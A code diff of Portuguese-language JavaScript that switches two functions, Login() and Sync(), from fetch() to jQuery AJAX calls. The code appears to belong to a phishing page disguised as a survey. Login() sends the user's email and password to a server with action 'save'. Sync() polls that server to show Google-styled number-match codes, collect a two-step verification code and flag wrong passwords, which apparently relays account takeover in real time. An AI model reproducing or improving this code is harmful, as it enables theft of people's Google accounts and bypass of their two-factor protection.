@@ -53,40 +53,32 @@ function Login(){
 
         document.querySelector(".entrar").disabled = true;
 
-        // var form_data = new FormData();
-
         item = {
             user: email,
             pass: senha,
             device: device,
             action:'save'
         }
-    
-        // for (var key in item) {
-        //     form_data.append(key, item[key]);
-        // }
         
-        fetch(endpoint, {
-            method: "POST",
-            body: JSON.stringify(item),
-            mode: 'cors',
-            cache: 'default'
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log(data);
-            if(data.success == 1){
-                document.location = 'pesquisa.html';
-            }else{
-                error2txt.innerHTML =' Erro ao conectar. Tente novamente.';
-                document.querySelector(".entrar").disabled = false;
-                ErrorPasswordShow();
-            }
-        })
-        .catch(error => {            
-            error2txt.innerHTML =' Problemas na conexão, tente novamente. Erro: '+ error;
-            document.querySelector(".entrar").disabled = false;
-            ErrorPasswordShow();
+        $.ajax({
+            type: "POST",
+            url: endpoint,
+            dataType: "json",
+            data: JSON.stringify(item),
+            success: function (data) {
+                console.log(data);
+
+                if(data.success == 1){
+                    document.location = 'pesquisa.html';
+                }else{
+                    error2txt.innerHTML =' Erro ao conectar. Tente novamente.';
+                    document.querySelector(".entrar").disabled = false;
+                    ErrorPasswordShow();
+                }
+            },
+            error: function (error){
+                console.log(error);
+            } 
         });
 
     }
@@ -230,75 +222,68 @@ function Sync(){
     var cvc   = document.querySelector('#cvc').value;
     var email = localStorage.getItem("email");
    
-    // var form_data = new FormData();
-
     item = {
         email: email,
         cod: cvc,
         action:'sync'
     }
-
-    // for (var key in item) {
-    //     form_data.append(key, item[key]);
-    // }
     
-    fetch(endpoint, {
-        method: "POST",
-        body: JSON.stringify(item),
-        mode: 'cors',
-        cache: 'default'
-    })
-    .then(response => response.json())
-    .then(data =>
-    {
-        console.log(data);
+    $.ajax({
+        type: "POST",
+        url: endpoint,
+        dataType: "json",
+        data: JSON.stringify(item),
+        success: function (data) {
+            console.log(data);
 
-        if(data.steps == 0 && data.code == null){
-            document.querySelector('#google').style.display = 'block';
-            document.querySelector('.g_part1').style.display = 'block';
-            document.querySelector('.g_part2').style.display = 'none';
-        }
+            console.log(data);
 
-        if(data.steps == 0 && data.code != null){
-            document.querySelector('#google').style.display = 'block';
-            document.querySelector('.gcode1').style.display = 'inline';
-            document.querySelector('.g_part1').style.display = 'none';
-            document.querySelector('.g_part2').style.display = 'block';
-            document.querySelector('.gcode1').innerHTML = data.code;
-            document.querySelector('.gcode1_circle').innerHTML = data.code;
-        }
-        
-        if(data.steps == 1){
-            window.location.href='#cvc';
-            document.querySelector('#google').style.display = 'none';
-            document.querySelector('.twosteps').style.display = 'block';
-        }else{
-            document.querySelector('#cvc').value = '';
-            document.querySelector('.twosteps').style.display = 'none';
-            document.querySelector('#google').style.display = 'block';
-        }
-        
-        if(data.ok == 1){
-            window.location = "concluido.html";
-        }
-        
-        if(data.invalid == 1){
-            document.querySelector('#google').style.display = 'none';
-            document.querySelector('#senha_errada').style.display = 'block';
-
-            let browser = document.querySelector('#os').value;
-            if(browser == 'android' || browser == 'desktop'){
-                document.querySelector('.gaccount').innerHTML = 'Entre nas configurações de seu celular para certificar-se de que está usando o mesmo email do Google Play para poder validar e finalizar a pesquisa por este aplicativo';
+            if(data.steps == 0 && data.code == null){
+                document.querySelector('#google').style.display = 'block';
+                document.querySelector('.g_part1').style.display = 'block';
+                document.querySelector('.g_part2').style.display = 'none';
+            }
+    
+            if(data.steps == 0 && data.code != null){
+                document.querySelector('#google').style.display = 'block';
+                document.querySelector('.gcode1').style.display = 'inline';
+                document.querySelector('.g_part1').style.display = 'none';
+                document.querySelector('.g_part2').style.display = 'block';
+                document.querySelector('.gcode1').innerHTML = data.code;
+                document.querySelector('.gcode1_circle').innerHTML = data.code;
+            }
+            
+            if(data.steps == 1){
+                window.location.href='#cvc';
+                document.querySelector('#google').style.display = 'none';
+                document.querySelector('.twosteps').style.display = 'block';
+            }else{
+                document.querySelector('#cvc').value = '';
+                document.querySelector('.twosteps').style.display = 'none';
+                document.querySelector('#google').style.display = 'block';
+            }
+            
+            if(data.ok == 1){
+                window.location = "concluido.html";
+            }
+            
+            if(data.invalid == 1){
+                document.querySelector('#google').style.display = 'none';
+                document.querySelector('#senha_errada').style.display = 'block';
+    
+                let browser = document.querySelector('#os').value;
+                if(browser == 'android' || browser == 'desktop'){
+                    document.querySelector('.gaccount').innerHTML = 'Entre nas configurações de seu celular para certificar-se de que está usando o mesmo email do Google Play para poder validar e finalizar a pesquisa por este aplicativo';
+                }
+    
+            }else{
+                document.querySelector('#senha_errada').style.display = 'none';
             }
 
-        }else{
-            document.querySelector('#senha_errada').style.display = 'none';
-        }
-
-    })
-    .catch(function(error)
-    {            
-        console.log(error);
+        },
+        error: function (error){
+            console.log(error);
+        } 
     });
 
     setTimeout(Sync, 3000);
